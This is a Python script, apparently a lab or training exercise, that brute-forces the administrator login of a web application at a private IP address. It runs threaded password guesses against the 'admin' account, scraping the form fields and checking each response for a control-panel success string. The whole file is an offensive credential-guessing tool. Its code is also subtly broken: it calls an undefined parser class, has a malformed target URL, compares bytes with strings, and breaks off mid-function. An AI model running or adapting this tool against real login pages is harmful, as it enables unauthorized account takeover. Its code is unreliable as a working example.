import urllib3
import urllib
from urllib import request, parse
import threading
import sys
import queue
import html.parser
import http.cookiejar

user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

# where script will donload and parse HTML
target_url = "http://192.168.112.131/administrator/index/php"
# where we will submit brute-forcing attempt
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

# string to check for to see if we are successful
success_check = "Administration - Control Panel"


class Bruter():
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()

            # create CookieJar to store all cookies
            jar = http.cookiejar.FileCookieJar("Cookies")

            # pass any cookies to cookie jar
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            # initial request to get login form
            response = opener.open(target_url)
            page = response.read()

            print("Trying %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print("[*] Bruteforce successfull.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for all threads to finish...")